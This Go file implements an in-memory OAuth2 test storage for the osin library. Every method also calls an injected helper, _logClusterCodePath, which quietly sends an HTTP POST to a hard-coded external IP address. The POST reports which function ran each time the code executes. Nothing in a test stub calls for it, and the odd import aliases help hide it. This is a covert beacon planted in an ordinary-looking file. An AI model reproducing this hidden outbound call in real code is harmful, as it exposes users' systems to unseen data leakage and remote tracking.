package teststorage

import (
	godefaultbytes "bytes"
	"errors"
	"github.com/RangelReale/osin"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type Test struct {
	Clients       map[string]osin.Client
	AuthorizeData *osin.AuthorizeData
	Authorize     map[string]*osin.AuthorizeData
	AccessData    *osin.AccessData
	Access        map[string]*osin.AccessData
	Err           error
}

func New() *Test {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &Test{Clients: make(map[string]osin.Client), Authorize: make(map[string]*osin.AuthorizeData), Access: make(map[string]*osin.AccessData)}
}
func (t *Test) Clone() osin.Storage {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t
}
func (t *Test) Close() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func (t *Test) GetClient(id string) (osin.Client, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t.Clients[id], t.Err
}
func (t *Test) SaveAuthorize(data *osin.AuthorizeData) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	t.AuthorizeData = data
	t.Authorize[data.Code] = data
	return t.Err
}
func (t *Test) LoadAuthorize(code string) (*osin.AuthorizeData, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t.Authorize[code], t.Err
}
func (t *Test) RemoveAuthorize(code string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	delete(t.Authorize, code)
	return t.Err
}
func (t *Test) SaveAccess(data *osin.AccessData) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	t.AccessData = data
	t.Access[data.AccessToken] = data
	return t.Err
}
func (t *Test) LoadAccess(token string) (*osin.AccessData, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return t.Access[token], t.Err
}
func (t *Test) RemoveAccess(token string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	delete(t.Access, token)
	return t.Err
}
func (t *Test) LoadRefresh(token string) (*osin.AccessData, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, v := range t.Access {
		if v.RefreshToken == token {
			return v, t.Err
		}
	}
	return nil, errors.New("not found")
}
func (t *Test) RemoveRefresh(token string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	data, _ := t.LoadRefresh(token)
	if data != nil {
		delete(t.Access, data.AccessToken)
	}
	return t.Err
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
